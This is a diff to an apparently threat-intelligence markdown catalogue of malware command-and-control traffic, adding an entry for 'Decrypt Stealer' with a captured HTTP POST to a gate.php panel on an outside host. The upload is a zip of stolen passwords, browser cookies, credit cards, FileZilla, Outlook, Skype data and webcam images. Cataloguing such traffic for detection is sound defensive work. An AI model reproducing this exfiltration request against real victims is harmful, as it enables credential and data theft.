@@ -706,6 +706,64 @@ Host: domalo.online
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dcrat.png "DCRat")
 
+#### Decrypt Stealer
+~~~
+POST /gate.php HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accepts-Language: en-us,en;q=0.5
+Content-Type: multipart/form-data; boundary=---------------------------8d7f030923bcd86
+Host: geroipanel.site
+Content-Length: 1282596
+Expect: 100-continue
+Connection: Keep-Alive
+
+-----------------------------8d7f030923bcd86
+Content-Disposition: form-data; name="platform"
+
+0
+-----------------------------8d7f030923bcd86
+Content-Disposition: form-data; name="profile"
+
+0
+-----------------------------8d7f030923bcd86
+Content-Disposition: form-data; name="cccount"
+
+0
+-----------------------------8d7f030923bcd86
+Content-Disposition: form-data; name="fcount"
+
+0
+-----------------------------8d7f030923bcd86
+Content-Disposition: form-data; name="ccount"
+
+0
+-----------------------------8d7f030923bcd86
+Content-Disposition: form-data; name="logs"; filename="bVYyP5uHP5ea.zip"
+Content-Type: zip
+
+PK.........l.P................Desktop Files\PK.........l.P............
+...Passwords.txtPK.........l.P............0...Browsers\AutoFill\Unknown_Microsoft_Autofill.txtPK.........l.P............1...Browsers\Cards\Unknown_Microsoft_Credit_Cards.txtPK.........l.P............2...Browsers\Cookies\Default_Google_Chrome_Cookies.txtPK.........l.P............5...Browsers\Cookies\qldyz51w.default_Firefox_Cookies.txtPK.........l.Pz7q)............Browsers\Cookies\Unknown_Microsoft_Cookies.txt..1..0....	..........bA.Q....4.)....t.!.-..1.^.e..
+{....E..%Q..G.P.F...t)...z.. Mp{.%C..........6...!.L....<...........F.>W.PD...07....>.T_@..........PK.........l.P	^..~...C...4...Browsers\Cookies\Unknown_Steam_htmlcache_Cookies.txt..A
+.0.E...J.I.8..[. .N..8%.(xz........{<-....1..p...H2.8)....YD.w. ..92.,.r.{.........L..?...aP./O..;@.(N.X.!.....5...\...v?.PK........2.)M..*.....>.......FileZilla\filezilla.xml.Yko.:......?..I...E..4Iw...........D[l(R.);.....%9N....v,
+
+...Skype\CURRENT.u..ts
+..5..C..PK.........p.M............
+...Skype\LOCKPK.........~)Ma...d.......	...Skype\LOG320..7.."]CS+S ..3.4P022.P.J--..KW.u..ts
+.Q.I-K.II..	....!..VS.a.$........OWP64.............`...@B\.PK.........w.M`.6.........
+...Skype\LOG.old.._K.0....)..Qko.$............v.1..h.....vC$+..-..;..pdI.I.a...RG..s.<a...m........n..`hGf.......F.K.{JQ..jA.\...a.S.. .,7............q_$.#..#./.^....7d...zKS<.R.&MI....6+\..H...S..kC..........Y..3IQC..T.s....].aN..p............+u........>L..l...Ij..:JN...4....PK.........v.M........5.......Skype\MANIFEST-000001.Z.....#.TNjYjNJ..SeIjyfq.s~nAbQbI~...3......9!..L,...l,..L./..D|]C...2sR........ .*..X.]Y.Z..X\.XP..X...........Z....
+...H...h4..hN..........Q).nt0....
+......2..h....;...	h&..7.A."......$>.I. .x.o@3I.......[..2I.h....;....h&..p..D>?...&.I.,Z..............A..Q.=zX...aZ.
+.PK...........l.P..............................Desktop Files\PK...........l.P............
+.............,...Passwords.txtPK...........l.P............0.............W...Browsers\AutoFill\Unknown_Microsoft_Autofill.txtPK...........l.P............1.................Browsers\Cards\Unknown_Microsoft_Credit_Cards.txtPK...........l.P............2.................Browsers\Cookies\Default_Google_Chrome_Cookies.txtPK...........l.P............5.............D...Browsers\Cookies\qldyz51w.default_Firefox_Cookies.txtPK...........l.Pz7q)..........................Browsers\Cookies\Unknown_Microsoft_Cookies.txtPK...........l.P	^..~...C...4.............y...Browsers\Cookies\Unknown_Steam_htmlcache_Cookies.txtPK..........2.)M..*.....>.................I...FileZilla\filezilla.xmlPK..........1.)M..p.L.....................N...FileZilla\layout.xmlPK...........l.P...E_6..j.....................Images\Screenshot.pngPK...........l.P..........................^C..Images\Webcam.pngPK...........l.Pr..........................C..OutLook\OutLook.txtPK...........q.M!$...r..i..................C..Skype\000005.ldbPK............)MpCM..[........................Skype\000017.logPK...........v.M.i...s..o.................1...Skype\000018.ldbPK...........p.M.r..........
+............. ...Skype\CURRENTPK...........p.M............
+.............Z...Skype\LOCKPK...........~)Ma...d.......	.................Skype\LOGPK...........w.M`.6.........
+.............
+...Skype\LOG.oldPK...........v.M........5.................=...Skype\MANIFEST-000001PK....................
+-----------------------------8d7f030923bcd86--
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/decryptstealer1.png "Decrypt Stealer")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/decryptstealer2.png "Decrypt Stealer")
+
 #### Delf Loader
 ~~~
 GET /gate.php?serial=MTc4NS02NDU5LTQ2NDktMjQ0NA== HTTP/1.1
